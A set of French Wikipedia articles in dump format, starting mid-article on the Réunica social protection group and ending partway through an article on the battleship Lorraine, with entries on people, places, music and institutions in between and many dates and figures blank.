Plusieurs opérations ont ainsi été menées telle que l’exposition « Sur les pas des héros » au Palais de Tokyo , des petits-déjeuners conférence avec les hôpitaux. La Fondation soutient différentes associations telles que « Les Ailes du Petit Prince ». Elle a également mis en place les « Sorties Culturelles » qui offrent la possibilité aux collaborateurs du Groupe Réunica et à des personnes touchées par le handicap ou la maladie de bénéficier, un après-midi par mois, d’une sortie culturelle (musée, exposition, monument). La Fondation a récemment contracté un partenariat avec l’Institut du Monde Arabe.
Stratégie.
Développement du groupe.
Le contexte économique est devenu incertain et les règles de solvabilité se renforcent : le mouvement de concentration des institutions de protection sociale s’accélère. Réunica souhaite augmenter sa taille pour créer des synergies autour des métiers de la protection sociale. Les rapprochements de Réunica se sont initiés en 2004 avec Bayard Retraite Prévoyance. En 2010, c’est avec Arpege que Réunica concluait son rapprochement. Après deux partenariats réussis, le projet de rapprochement avec Pro BTP reste sans suite. Le , le Groupe Réunica a adressé un dossier de consultation à de protection sociale présélectionnés : AG2R La Mondiale, Apicil et Malakoff-Médéric. L’Association Sommitale de Réunica réunie en conseil le , a retenu AG2R LA MONDIALE pour construire un nouveau groupe. En 2014, les Assemblées générales d’AG2R LA MONDIALE, RÉUNICA et VIASANTÉ adoptent à l'unanimité le principe de rapprochement. Naissance du nouvel ensemble le .
Responsabilité sociale, sociétale et environnementale.
Réunica a mis en place un audit sur le respect des principes ISR (Investissements Socialement Responsables) mené par Vigeo, un cabinet indépendant. Il analyse le portefeuille du placement et présente les résultats régulièrement aux commissions financières du Groupe.
Réunica a instauré une charte « diversité » en faveur de l’employabilité des personnes handicapées : celles-ci représentent 6 % des équipes Réunica. Les salariés peuvent aussi bénéficier de formations via « Campus Réunica » pour accompagner le changement et la mise en place des nouveaux outils. Depuis 2007, ils sont impliqués dans l’évolution du Groupe grâce à la mise en place de « journées créatives » où chacun peut faire part de ses idées pour améliorer les procédures, les produits ou le quotidien professionnel. Une plateforme collaborative baptisée « Eureka ! J’ai une idée » permet de collecter les idées des salariés dont les meilleures sont récompensées par un « Trophée Eureka ».
Concernant l’environnement, Réunica a mis en place certaines actions responsables telles qu’une politique d’achats durables ou la construction d’un bâtiment Réunica labellisé Très Haute Performance Énergétique. Le Groupe a par ailleurs réalisé un audit pour l’optimisation de la consommation énergétique du parc informatique géré par le GIE Systalians. Cet audit a abouti à la mise en place d’un logiciel spécifique pour réduire la consommation globale des postes de travail, passant d’une consommation de /an/poste à /an/poste. Réunica s’est également associé aux autres organismes de protection sociale du réseau Net-entreprises pour une opération de reboisement à Marseille en 2011.
Label, certifications, distinctions.
L’ensemble des activités de gestion de l’assurance de personnes et des centres de contact de Groupe RÉUNICA sont certifiés ISO 9001.
Réunica est le premier groupe de protection sociale à obtenir la certification professionnelle de sa Direction de l’audit interne délivrée par l’Institut Français de l’Audit et du Contrôle Internes IFACI .
Réunica Prévoyance Pro a obtenu les Labels d’Excellence 2012 et 2013 des Dossiers de l’Epargne. 
Le GIE informatique du Groupe, Systalians est, de son côté, certifié ISO 9001, ISO 27001 et ISO 20000 depuis fin 2009. Ces trois certifications ont été renouvelées mi-2012 par l’AFNOR.

</doc>
<doc id="6807736" url="https://fr.wikipedia.org/wiki?curid=6807736" title="Rockbound Neighbors">
Rockbound Neighbors

Rockbound Neighbors est le studio de la chanteuse et seiyū japonaise Nana Mizuki sorti le sous le label King Records. Il arrive à l'Oricon. Il se vend à exemplaires la première semaine et reste classé 20 semaines pour un total de exemplaires vendus. L'édition limitée du CD+DVD est dans une spéciale box et contient un photobook.

</doc>
<doc id="6807746" url="https://fr.wikipedia.org/wiki?curid=6807746" title="Gare de Høvik">
Gare de Høvik

La gare de Høvik est une gare ferroviaire, destinée au trafic local, de la ligne de Drammen. La gare se situe dans la commune de Bærum et à 10.72 km de la gare d'Oslo. 

</doc>
<doc id="6807749" url="https://fr.wikipedia.org/wiki?curid=6807749" title="Maurice Deixonne">
Maurice Deixonne

Maurice Deixonne, né le à Curepipe (Ile Maurice) et mort le à Uriage (Isère), est un homme politique français.
Biographie.
Il est orphelin de père à sa naissance, et sa mère est frappée de troubles mentaux ; il est élevé par ses grands-parents à partir de l'âge de cinq ans, puis par une tante après leur décès, en 1914. Boursier, il suit des études brillantes qui le conduisent à l'École normale supérieure, il est reçu en 1930 à l'agrégation de philosophie, discipline qu'il enseigne au lycée de Valenciennes jusqu'en 1933. Il exerce ensuite à Aurillac, Gap, Auch et Lourdes. Il met en œuvre des méthodes d'enseignement novatrices et originales, qui lui valent une certaine méfiance de sa hiérarchie, que les excellents résultats de ses élèves aux examens tempèrent cependant. 
Engagé dans l'action politique après avoir adhéré à la SFIO en 1926, avec le parrainage de Georges Lefranc et Jean Le Bail, il est l'année suivante le fondateur et le premier secrétaire de la Fédération nationale des étudiants socialistes, fonction qu'il conserve jusqu'en 1928. En 1929, il épouse Suzanne, fille de l'ancien député socialiste Georges Boully. Celle-ci fut une compagne de militantisme, à la fois dans le syndicalisme enseignant et dans l'action politique au sein de la SFIO. Elle fut, comme sont époux, victime de répression administrative, notamment en 1934, puis sous le régime de Vichy.
En 1932, il fait partie, avec notamment Georges Lefranc, Pierre Boivin, Claude Lévi-Strauss et Robert Marjolin, des auteurs de l'ouvrage "Révolution constructive", qui défend les idées planistes. En 1934, secrétaire de la fédération socialiste du Cantal, il est condamné à de la prison avec sursis, ce qui implique la privation des droits civiques, pour son implication dans une bagarre ayant suivi une réunion publique à laquelle il avait participé, en avril. Son déplacement du lycée d'Aurillac à celui de Gap, à la suite de cette condamnation, provoque une forte mobilisation, et il retrouve finalement son poste en 1936.
Plusieurs fois candidat (municipales, cantonales), à Aurillac, il porte les couleurs de la SFIO lors des élections législatives de 1936, et obtient 26,2 % des voix. Il se désiste pour le sortant radical Paul Bastid, qui est réélu.
Pacifiste, il milite aux côtés de la Gauche révolutionnaire de Marceau Pivert, sans y appartenir. Après le congrès de Royan, il reste à la SFIO et défend, lors du Congrès de Nantes ( congrès national, ), une motion pacifiste "radicale", aux côtés de Ludovic Zoretti, Georges Soulès et Berthe Fouchère. Celle-ci obtient 2,4 % des mandats et se rallie à Paul Faure.
Il est révoqué par le gouvernement de Vichy en décembre 1940. Il est alors contraint d'enseigner à Lourdes, dans un établissement privé laïc.
À la Libération, il est nommé inspecteur d'académie à Auch, puis proviseur du lycée d'Albi (1945-1946).
Secrétaire de la fédération socialiste, il est élu député du Tarn en juin 1946, il est ensuite constamment réélu jusqu'en 1958. Après la grève des mineurs de 1948, précédée d'un referendum auquel les mineurs étrangers avaient participé, il dépose un projet de loi avec Pierre Mazuez, député de Saône-et-Loire, pour interdire aux étrangers de voter lors des élections professionnelles. À l'Assemblée nationale, il devient le spécialiste des questions scolaires et de la laïcité pour la SFIO. Il participe notamment à une négociation secrète avec le Vatican, en compagnie de Robert Lecourt, de Villot et de Wladimir d'Ormesson. Il préside le groupe parlementaire socialiste en 1957 et 1958.
Le , il vote la confiance au général de Gaulle auprès duquel il a accompagné Guy Mollet le , à Colombey-les-Deux-Églises, en vue de préparer l'investiture de celui qui sera le dernier président du Conseil de la République.
Battu aux législatives de 1958, il s'installe à Paris, où il est directeur d'une annexe du lycée Montaigne, puis proviseur après sa transformation en lycée (lycée Rodin). Il se consacre alors essentiellement à l'office central de coopération à l'école, jusqu'à sa retraite en 1965, avant d'être secrétaire général du mouvement pour le planning familial. 
Son nom reste associé à la loi du 11 janvier 1951 relative à l'enseignement des langues et dialectes locaux.

</doc>
<doc id="6807756" url="https://fr.wikipedia.org/wiki?curid=6807756" title="Ordre de succession présidentielle de la France">
Ordre de succession présidentielle de la France



</doc>
<doc id="6807767" url="https://fr.wikipedia.org/wiki?curid=6807767" title="Église Saint-Martin de Biarritz">
Église Saint-Martin de Biarritz

L'église Saint-Martin est une église catholique située à Biarritz, dans le département français des Pyrénées-Atlantiques en région Nouvelle-Aquitaine. Elle fait partie de la paroisse Notre-Dame-du-Rocher conjointement avec l'église Sainte-Eugénie, l'église Saint-Charles, l'église Saint-Joseph, la chapelle du Saint-Esprit du Braou et enfin l'église Sainte-Thérèse de Biarritz. La paroisse dépend du diocèse de Bayonne.
Elle fait l'objet d'une inscription par les monuments historiques depuis 1931.
Histoire.
Saint Martin est choisi comme patron de Biarritz. La paroisse qui porte son nom remonte au temps de la domination anglaise. L'église actuelle est construite sur l'emplacement d'un édifice religieux primitif disparu et non documenté. De style roman, elle est agrandie et remaniée en 1541, d'après la date indiquée sur un pilier. 
Jusqu'en 1894, Saint-Martin est l'église paroissiale de la commune. À partir de 1861, elle est restaurée et embellie.Clément Mathieu y est vicaire à partir de 1906, période marquée par de graves tensions entre la Troisième République et l'Église de France, avant de diriger le séminaire de Bayonne.
Description.
L'église recèle des stalles en bois du , classées à titre d'objet depuis 1973.

</doc>
<doc id="6807772" url="https://fr.wikipedia.org/wiki?curid=6807772" title="Notre Dame de Rumengol (bateau)">
Notre Dame de Rumengol (bateau)



</doc>
<doc id="6807774" url="https://fr.wikipedia.org/wiki?curid=6807774" title="Chung Ki-young">
Chung Ki-young

Chung Ki-young est un boxeur sud-coréen né le à Gyeongsangbuk-do.
Carrière.
Champion de Corée et d'Asie OPBF des poids plumes en 1983 et 1984, il devient champion du monde IBF de la catégorie le 29 novembre 1985 après sa victoire par KO au contre son compatriote Oh Min-keun. Chung conserve son titre face à Tyrone Jackson et Richard Savage mais perd contre Antonio Rivera le 30 août 1986. Il met un terme à sa carrière après ce combat sur un bilan de 31 victoires, 5 défaites et 2 matchs nuls.

</doc>
<doc id="6807777" url="https://fr.wikipedia.org/wiki?curid=6807777" title="Torche (groupe)">
Torche (groupe)

Torche est un groupe de sludge/stoner metal originaire de Miami en Floride et formé en 2004 qui a publié cinq albums, dont le dernier, "Admission", est sorti en 2019.
Biographie.
Le groupe se forme en 2004 à Miami en Floride. Un premier album sort en 2005, sur le label Robotic Empire, il est distribué en Europe par le label de Mogwai, Rock Action.
Le deuxième "Meanderthal" est publié en 2008 par le label Hydra Head Records. Fin 2008, le guitariste Juan Montoya quitte le groupe. Le groupe publie en tant que trio un split single avec Boris, suivi en 2010 d'un EP intitulé "Songs For Singles". Le groupe redevient quatuor en 2011 avec l'arrivée Andrew Elstner.
Le troisième album, "Harmonicraft", est publié le par Volcom. En 2014, Torche signe sur le label indépendant américain Relapse. L'enregistrement du successeur de "Harmonicraft" a lieu au studio Pinecrust situé à Miami. Il est produit par le bassiste du groupe, Jonathan Nuñez, le mixage étant réalisé par Kurt Ballou du groupe Converge.
L'album "Restarter" sort le .
Le groupe annonce sa séparation après une ultime tournée nord-américaine en septembre et octobre 2022.

</doc>
<doc id="6807780" url="https://fr.wikipedia.org/wiki?curid=6807780" title="Ermitage Saint-Antoine de Galamus">
Ermitage Saint-Antoine de Galamus

L'ermitage Saint-Antoine de Galamus est un ermitage situé dans la commune de Saint-Paul-de-Fenouillet, dans les Pyrénées-Orientales.
Localisation.
L'ermitage de Saint-Antoine de Galamus est situé au nord-ouest de Saint-Paul-de-Fenouillet au sein des gorges de Galamus, en contrebas de la route départementale D 7 reliant Saint-Paul-de-Fenouillet à Cubières-sur-Cinoble dans l'Aude. L'ermitage est à une altitude de 376 mètres. Les gorges de Galamus, au fond desquelles serpente l'Agly, sont un site naturel classé depuis 1927.
Historique.
Bien que sans doute fréquenté depuis longtemps, le lieu est mentionné pour la première fois au , alors que des moines Franciscains aménagent la grotte en chapelle et construisent un ermitage à proximité.
En 1782, la fin de l'épidémie de suette qui touchait les habitants de Saint-Paul-de-Fenouillet est attribuée à la protection de saint Antoine.
Déserté après la Révolution, l'ermitage est réhabilité à partir de 1843 par le prêtre et moine franciscain Marie-Joseph Chiron (1797-1852), (créateur du calvaire du Montoulon à Privas) surnommé le "Père Marie", qui y vécut quelques années. Joseph Antoine Cervini et Antoine Ignace Melling visitent le lieu, alors désert, en 1821 et le décrivent comme « la plus belle merveille du Roussillon ».
L'ermitage conservait jadis des reliques de la Sainte-Croix, de sainte Victoire et plus tard du père Francisco Palau y Quer, mort en 1872 et béatifié en 1988.
Pèlerinage.
L'ermitage est un lieu de pèlerinage traditionnel les lundis de Pâques et les lundis de Pentecôte.
Dans les arts et la culture.
Le site de l'ermitage a servi de lieu de tournage de scènes des films suivants :

</doc>
<doc id="6807782" url="https://fr.wikipedia.org/wiki?curid=6807782" title="Louis Guibert">
Louis Guibert

Louis Guibert, né à Limoges, en Haute-Vienne, le , et mort dans la même ville le est un érudit français.
Fonctionnaire municipal à Limoges, il s'est fait historien de la Haute-Vienne, a publié des recueils de poésies et été l’auteur de récits dans le domaine des contes et légendes de Limoges et de sa région.
Une carrière de fonctionnaire, une œuvre d’érudit.
Louis Guibert est né à Limoges le . C'est le fils de Georges Guibert (1804-1860), directeur du Mont de Piété, et de Jeanne Guibert. Ses ancêtres sont ajusteurs de la Monnaie de père en fils.
Il a fait ses études à Limoges ; il a été employé de préfecture à Limoges, à partir de 1860 ; il a démissionné en 1863 et il s’est installé à Paris, où il a passé quelques années dans l’espoir d’y mener une carrière d’écrivain.
Revenu en Limousin, et il a été, de 1866 à 1868, chef de cabinet du préfet de la Creuse Henri Tharreau, à Guéret ; après 1870, il est nommé secrétaire de la mairie de Limoges.
Il a alors commencé des travaux de recherche sur l’histoire régionale, ce qui l’a amené à écrire et à publier de nombreux ouvrages d'historiographie sur Limoges et sa région.
Louis Guibert est mort à Limoges, le .
Poésies, recherches historiques, contes et légendes.
Une des œuvres de Louis Guibert qui a retenu l’attention a été son étude sur l'ordre de Grandmont et l'abbaye de Grandmont, qui est située dans une enclave de la Haute Marche.
Ses travaux — il y en a plus de cent — publiés dans diverses revues du Limousin ou parus chez des éditeurs limougeauds, ont touché à des domaines très divers : poésies et autres textes littéraires, études historiques liés aux « journaux » et « livres de raison », ouvrages historiques concernant les confréries et ordres religieux du Limousin, études historiques concernant la ville de Limoges et les villes et bourgs de la Haute-Vienne, ouvrages liés au « conte limousin » et aux légendes.
Voici ce que dit de Louis Guibert, à l’occasion de sa mort, le président de l'Académie des inscriptions et belles-lettres :Toute la vie de M. Guibert a été donnée à un même objet d'étude, sa province. Il a été, en qualité de secrétaire général, l'âme de la Société historique et archéologique du Limousin. Pendant une quarantaine d'années, il a produit des travaux aussi nombreux que variés : éditions de registres, de livres de raison et d'actes, catalogue des manuscrits du séminaire de Limoges, analyse d'un graduel du , monographies de localités limousines, études de topographie historique sur Limoges… Il s'est attaché particulièrement à élucider l'histoire des institutions, au Moyen Âge et dans les derniers temps de l'Ancien Régime, et c'est par là surtout qu'il a rendu des services à l'histoire générale. Parmi ses publications, toutes issues de recherches originales, on met au premier rang son "Histoire de l'ordre de Grandmont".
Louis Guibert a également été journaliste. Il a publié certains textes sous le pseudonyme de Jules Bonnet. On peut se faire une idée du style de Guibert et des sujets qu'il aborde en lisant le début de "Limoges qui s'en va — Le quartier Viraclaud".

</doc>
<doc id="6807787" url="https://fr.wikipedia.org/wiki?curid=6807787" title="Auguste Van Ormelingen">
Auguste Van Ormelingen

Auguste Marie Louis Félix Van Ormelingen, né le à Zichen-Zussen-Bolder et décédé le à Liège est un homme politique belge, membre du parti catholique.
Fils de notaire, docteur en droit (Université catholique de Louvain, 1894) et notaire (1896), il fut élu conseiller communal de Tongres (1903), échevin (1921), conseiller provincial de la province de Limbourg (Belgique) (1908-1912), député de l'arrondissement de Tongres-Maaseik (1912-1914), sénateur provincial de Limbourg en remplacement de "Fr. Meyers" (1919-1929).
Il fut créé officier de l'ordre de Léopold.

</doc>
<doc id="6807795" url="https://fr.wikipedia.org/wiki?curid=6807795" title="Dira Paes">
Dira Paes

Ecleidira « Dira » Maria Fonseca Paes (née à Abaetetuba le ) est une actrice brésilienne.
Biographie.
Dira Paes est née au cœur de la forêt amazonienne, sixième enfant d'une famille de sept. Elle est mère d'un garçon nommé Inácio Paes Baião dont Pablo Baião est le père. Inácio est né le à Rio de Janeiro (Brésil).

</doc>
<doc id="6807798" url="https://fr.wikipedia.org/wiki?curid=6807798" title="Katie Carter">
Katie Carter

Katie Carter est une joueuse de volley-ball américaine née le à Victorville (Californie). Elle mesure et joue au poste d'attaquante.

</doc>
<doc id="6807800" url="https://fr.wikipedia.org/wiki?curid=6807800" title="Stalle (homonymie)">
Stalle (homonymie)

Le mot stalle peut désigner :

</doc>
<doc id="6807801" url="https://fr.wikipedia.org/wiki?curid=6807801" title="Phase finale de la Ligue Europa 2012-2013">
Phase finale de la Ligue Europa 2012-2013

Cet article présente les résultats détaillés de la phase finale de l'édition 2012-2013 de la Ligue Europa.
Qualification.
Participent à la phase finale
Tirage au sort des seizièmes de finale.
Le tirage est réalisé de sorte que les équipes d'une même association ou d'un même groupe du tirage au sort ne se rencontrent pas. De même, les têtes de série doivent affronter des non-têtes de série et les recevoir lors du match retour, la liste des participants étant divisée en têtes de série et non-têtes de série selon :
La liste des équipes de cette phase finale :
La phase finale de la Ligue Europa 2012-2013 a commencé le avec les de finale et se terminera le avec la finale à l'Amsterdam ArenA à Amsterdam, aux Pays-Bas.
Tirages au sort et dates.
Tous les tirages au sort se déroulent à Nyon, en Suisse.
Seizièmes de finale.
Les matchs aller se jouent le et les matchs retour le .

</doc>
<doc id="6807802" url="https://fr.wikipedia.org/wiki?curid=6807802" title="Communauté de communes Pays d'Uzès">
Communauté de communes Pays d'Uzès

La communauté de communes Pays d'Uzès est une communauté de communes française située dans le département du Gard et la région Occitanie, dont le siège est situé à Uzès.
Historique.
L'établissement public de coopération intercommunale a vu le jour en 2013 sous l'impulsion de Nicole Perez (SE), maire de Flaux et présidente de la communauté de communes de l'Uzège (2008 - 2012) qui présidait également l'entente intercommunale préfigurant la nouvelle communauté de communes. 
Le périmètre de la nouvelle communauté de communes a été acté par un arrêté du . Il couvre la communauté de communes de l'Uzège, la communauté de communes du Grand Lussan et 7 communes isolées : Aubussargues, Baron, Bourdic, Collorgues, Foissac, Garrigues-Sainte-Eulalie, Saint-Dézéry. La communauté de communes est entrée en vigueur le .
Le , elle s'étend à la commune de Moussac, issue de la communauté de communes de Leins Gardonnenque.
Le , elle s'étend à la commune de Bouquet, issue d'Alès Agglomération.
Le , elle intègre la commune Argilliers.
Le , la commune de Castillon-du-Gard rejoint l'intercommunalité.
Territoire communautaire.
Composition.
La communauté de communes est composée des suivantes :
Administration.
Siège.
Le siège de la communauté de communes est situé à Uzès.
Les élus.
Le conseil communautaire de la communauté de communes se compose de 58 conseillers, représentant chacune des communes membres et élus pour une durée de six ans.
Ils sont répartis comme suit :
Présidence.
À la suite des élections municipales et communautaires de 2020, le conseil communautaire, réuni le , élit comme président Fabrice Verdier, adjoint au maire d'Uzès, ainsi que 14 vice-présidents pour constituer le bureau communautaire.
Régime fiscal et budget.
Le régime fiscal de la communauté de communes est la fiscalité professionnelle unique (FPU).

</doc>
<doc id="6807803" url="https://fr.wikipedia.org/wiki?curid=6807803" title="Nicola Morelli">
Nicola Morelli

Nicola Morelli (né à Matera le , mort à Rome le ) est un sculpteur, un acteur et un écrivain italien.
Biographie.
En 1940, Nicola Morelli entre à l'académie militaire de Modène, où il obtient le grade de sous-lieutenant. Après avoir participé à la Seconde Guerre mondiale, il quitte l'armée à cause d'un incident survenu lors d'un saut en parachute.
Comme sculpteur, ses œuvres sont situées à Washington, au siège du Comité national olympique italien (CONI) à Rome, à Montescaglioso avec une représentation de saint François et Bernalda, une statue de saint Bernardin. Dans sa ville natale, il a créé des gravures dans l'église de Saint-Paul et les médailles dédiées à la visite du pape Jean-Paul II à Matera.
En tant qu'acteur, Morelli a participé à des films comme "L'An un" (1974) de Roberto Rossellini, "Fantozzi" (1975) de Luciano Salce et "Le Fou de guerre" (1985) de Dino Risi.
Il a été aussi l'auteur de deux essais sur les Sassi di Matera : "Vita agli inferi" (1951) et "Le storie di Cheravanna" (1994).
Morelli est mort à Rome en 1994 et enterré dans sa ville natale.

</doc>
<doc id="6807805" url="https://fr.wikipedia.org/wiki?curid=6807805" title="Boulevard Benoni-Goullin">
Boulevard Benoni-Goullin

Le boulevard Benoni-Goullin est une rue de Nantes, en France.
Situation et accès.
Située sur l'île de Nantes, cette artère rectiligne, longue de , relie le boulevard Victor-Hugo au boulevard Gustave-Roch. Sur son tracé, elle rencontre successivement la rue René-Peigné, l'avenue de la Gare-de-Legé et la rue du Scorff.
Entre ces deux dernières voies, une piste cyclable non dénommée longe la ligne de Nantes à Saint-Gilles-Croix-de-Vie pour rejoindre Rezé via le pont ferroviaire de Pirmil.
Origine du nom.
en mémoire de Pierre Benoni Goullin (1799-), négociant nantais né et mort dans cette ville, consul de Belgique, président du Tribunal de commerce de Nantes, membre de la Chambre de commerce et du Conseil municipal de Nantes.
Historique.
Cette voirie fut créée initialement entre le boulevard Gustave-Roch et celui des Antilles pour desservir par le nord les nouveaux quartiers de l'île Sainte-Anne. Elle a été baptisée dès sa création dans les années 1900, « boulevard Benoni-Goullin » (elle allait alors du boulevard Gustave-Roch à celui des Antilles) 
Par la suite, cette artère sera prolongée vers le boulevard Victor-Hugo, s'étendant ainsi sur , l'une des plus longues voiries de la ville.
La construction du marché d'intérêt national (M.I.N), au début des années 1960 et inauguré en 1969, ampute le boulevard de son tracé initial. Les emprises ferroviaires de la gare de l'État débordent également sur l'ex-voirie. Seule, l'extrémité occidentale ainsi isolée est conservée et intégrée à la rue de Saint-Domingue par décision du Conseil municipal de 18 décembre 1972.
Durant la même période, le boulevard est traversé par un double voie ferroviaire par l'intermédiaire d'un pont situé à son extrémité orientale qui permet à la Ligne ferroviaire Nantes - Saint-Gilles-Croix-de-Vie de rejoindre la rive sud du fleuve. Cet aménagement, dont les travaux durèrent deux ans, fut nécessaire afin de supprimer le passage à niveau dans l'ancien tracé de la ligne qui empruntait les boulevards Vincent-Gâche et Babin-Chevaye, et qui constituait un sérieux inconvénient pour la circulation automobile entre les deux rives de la Loire.
Projet.
Dans le cadre du projet de rénovation urbaine mené par l’équipe de maîtrise d'œuvre composée d'uapS (architecte urbaniste) et l'urbaniste Marcel Smets, le transfert du M.I.N dans la banlieue sud de Nantes, à Rezé, permettra de libérer les terrains, afin de prolonger de nouveau le boulevard, lui rendant ainsi une partie de son tracé d'origine. Sur le côté sud sera implanté le nouveau CHU dont l'emprise s'étendra jusqu'à la Loire, tandis que sur son côté nord un immeuble devant accueillir des entreprises dans le domaine des biotechnologies (Bio Ouest) et l'Institut de recherche en santé (IRT2 et IRT Campus) est en cours de construction (livraison prévue au début de l'été 2015). Son extrémité Ouest débouchera sur une artère (baptisée depuis boulevard Simone-Veil) qui reliera le boulevard Léon-Bureau jusqu'au pont des Trois-Continents. L'équipe Smets envisageait déjà d'y faire également circuler une future ligne de transport en commun sur site propre (la future ligne 8 du Busway).
Bâtiments remarquables et lieux de mémoire.
La famille Say, industriels du textile, s'installe à Nantes après une crise du secteur, en 1813. Louis Say rachète une usine de sucre dans le « quartier des Ponts », mais est supplanté et quitte la ville. De retour à Nantes, la famille Say fait édifier une nouvelle usine boulevard Benoni-Goullin en 1936, mais les bâtiments sont détruits lors de la Seconde Guerre mondiale. Un nouvel édifice est reconstruit. En 1973, l'entreprise devient Beghin-Say. L'établissement, qui marque le paysage urbain de ses couleurs bleu et blanc, est repris par le groupe Tereos avant de cesser son activité de raffinage de sucre de canne en 2009, dont il s'agissait de la dernière usine en France. Cependant, les activités de conditionnement y sont toujours effectuées, après que Tereos ait menacé de fermer définitivement le site en 2012.
Voies liées.
Avenue de la Gare-de-Legé.
Cette impasse longue d'environ a été aménagée à la fin des années 1930, à la suite de la démolition de la gare de Legé qui occupait jusqu'alors le terrain.

</doc>
<doc id="6807808" url="https://fr.wikipedia.org/wiki?curid=6807808" title="Tomie Ohtake">
Tomie Ohtake

, née à Kyoto le et morte le à São Paulo, est une artiste peintre et sculptrice japonaise et brésilienne.
Biographie.
Peintre-abstrait, Tomie Ohtake travaille à São Paulo. Depuis 1957, elle participe à de nombreuses expositions collectives, Londres, Vienne (Autriche) et São Paulo où elle reçoit la médaille d'or au Salon d'Art Moderne.
D'abord dans le courant de l'abstraction lyrique, elle évolue dans le sens d'une structure géométrique disciplinant la gestualité informelle.
Tomie Ohtake meurt d'une pneumonie à l'âge de 101 ans à l' de São Paulo.

</doc>
<doc id="6807811" url="https://fr.wikipedia.org/wiki?curid=6807811" title="Restrepo (Meta)">
Restrepo (Meta)

Restrepo est une municipalité (") colombienne du département de Meta.
Le chef-lieu de la municipalité de Restrepo porte le même nom et se trouve à l’altitude moyenne de .
Restrepo est située dans la partie nord du département du Meta. C’est la capitale salinière du département.
Comme la plupart des municipalités colombiennes, Restrepo s’est dotée de trois symboles modernes : un , un blason et un drapeau (voir ci-contre).
Histoire et noms.
Le nom de la municipalité vient du patronyme d’Emiliano Restrepo qui fut le donateur du terrain sur lequel fut établie la première implantation du hameau en 1905, sous le nom de « hameau de la Conception » (").
Par décret du , elle fut rebaptisée « la Colonie » (""). Elle porte son nom actuel de "Restrepo" depuis le 1915.
Hydrographie.
La municipalité est traversée par les rivières (") suivantes :

</doc>
<doc id="6807817" url="https://fr.wikipedia.org/wiki?curid=6807817" title="Lorraine (cuirassé)">
Lorraine (cuirassé)

La Lorraine est un cuirassé français de la classe Bretagne, construit en 1913 et rayé des listes de la flotte en 1953.
Origine.
La classe Bretagne est issue de la loi-programme du . Le texte était ambitieux, qui visait à fixer la flotte à vingt-huit cuirassés, dix éclaireurs d’escadre, cinquante-deux torpilleurs dits de « haute-mer », dix bâtiments pour divisions lointaines et quatre-vingt quatorze sous-marins.
À l'époque du vote de la loi, la France dispose d'une flotte de cuirassés non négligeable (dont douze cuirassés modernes : deux « classe République » ; quatre « classe Liberté » ; et six « classe Danton »), mais qui compte aussi des navires totalement dépassés, dont ceux issus programme naval de 1890, dit flotte d'échantillons. Ce programme avait le tort de fixer uniquement la composition de l'artillerie principale, la vitesse minimale et le déplacement maximal de . Le reste était laissé à l'imagination des ingénieurs, ce qui a donné des bâtiments n'ayant pas la même silhouette, la même propulsion, le même calibre d'artillerie secondaire, le même compartimentage ou le même blindage.
Cette absence de normes avait des conséquences désastreuses en termes d'entretien, d'approvisionnement ou même en ordre de bataille, avec des bâtiments parfois très différents, mais qui avaient en commun une mauvaise protection de la zone en dessous de la ligne de flottaison. Ainsi, le "Bouvet", issu du programme de 1890 chavirera et coulera en moins d'une minute, emportant la majeure partie de son équipage de 700 marins, après avoir touché une mine dans le détroit des Dardanelles le lors de la bataille du même nom.
Cette flotte de cuirassés est donc assez disparate, mais surtout quasiment rendue obsolète par l'entrée en service du britannique en 1906.
La France réagit tardivement à cette révolution, qui a conduit à une course à l'armement, et ce n'est qu'à l'occasion du programme naval de 1910 que la première classe de Dreadnoughts français est programmée, avec la classe Courbet, qui sera suivie par la classe Bretagne, dont est issue la "Lorraine".
Le pays est toutefois handicapé par le manque de forme de radoub de taille suffisante, les bassins Vauban de Toulon ne seront terminés qu'en 1927, ce qui va conduire à une reprise par les classes Bretagne des coques des classes Courbet.
Construction et équipement.
Nommé d'après la région Lorraine, le cuirassé est mis en chantier dans le cadre du programme 10.12 aux Ateliers et Chantiers de la Loire (ACL) de Saint-Nazaire en . Troisième navire de la classe Bretagne, son lancement intervint le et il est effectivement admis au service le .
Il a une longueur hors tout de 166 mètres pour une largeur au fort (maître-bau) de 26,9 mètres et un tirant d'eau de 9,8 mètres. Son déplacement théorique est , soit environ à pleine charge, avec un équipage compris entre 1124 et 1133 officiers, officiers mariniers quartiers-maîtres et matelots.
L'appareil propulsif de ce bâtiment est composé de quatre turbines à vapeur Parsons. Son appareil évaporatoire se compose de 24 chaudières multitubulaires produites par Guyot Du Temple, avec une puissance développée de chevaux pour une vitesse maximale de 21 nœuds. Il emporte à l'origine tonnes de charbon, pour une distance franchissable de nautiques à 10 nœuds.
L'armement principal de la "Lorraine" est constitué de dix canons de 340 mm/45 modèle 1912 disposés en cinq tourelles doubles, deux superposées à l'avant, deux superposées à l'arrière et une entre les deux cheminées. La tourelle centrale ne recevra ses canons qu'en .
Son artillerie secondaire consiste en 22 canons de 138 mm modèle 1910, installés en casemates le long de la coque, ainsi que sept canons Hotchkiss de 47 mm modèle 1885, un sur chacun des tourelles principales et deux sur le château du cuirassé. Il reçoit également quatre tubes lance torpilles, pouvant lancer des torpilles de 450 mm.
La ceinture blindée principale atteint 270 mm d'épaisseur et le pont était blindé à hauteur de 40 mm, alors que les tourelles sont protégées par un blindage de 300 mm, l'artillerie secondaire en casemate recevant un blindage de 17 mm. Le château est protégé par un blindage de 314 mm.
Historique.
Pendant la première Guerre Mondiale.
La "Lorraine" est affectée, avec les deux autres bâtiments de sa classe, à la division de cuirassés de la escadre, dont la mission principale est d'empêcher la sortie de la flotte austro-hongroise de la mer adriatique. Ils maintiendront leur position sur Corfou pendant toute la durée de la guerre, mais la "Lorraine" est engagée le dans les Vêpres grecques (événements de novembre pour les Grecs) avec 22 autres bâtiments, dont le Mirabeau qui ouvre le feu sur la capitale grecque.
À cette époque, une partie de son équipage fut débarquée pour participer à la lutte anti-sous-marine et la "Lorraine" ne connut guère d'action pendant la Grande Guerre, en particulier du fait de son carénage à Toulon en 1917, si ce n'est son transport du Maréchal Joffre aux États-Unis.
Grâce à son carénage, elle voit la portée de son artillerie principale allongée, elle passe de m à m à la suite d'une modification de la capacité d'élévation des canons, qui passe de 12 à 18 degrés. Les sisters-ships de sa classe verront eux aussi leur artillerie principale améliorée après l'armistice, passant à m de portée.
Après la défaite des Empires centraux, La Lorraine est chargée d'escorter ce qui reste de la flotte austro-hongroise vers la France et l'Italie, avant qu'il ne soit statué sur son sort dans le cadre des négociations d'après guerre..
Dans l’entre-deux guerres.
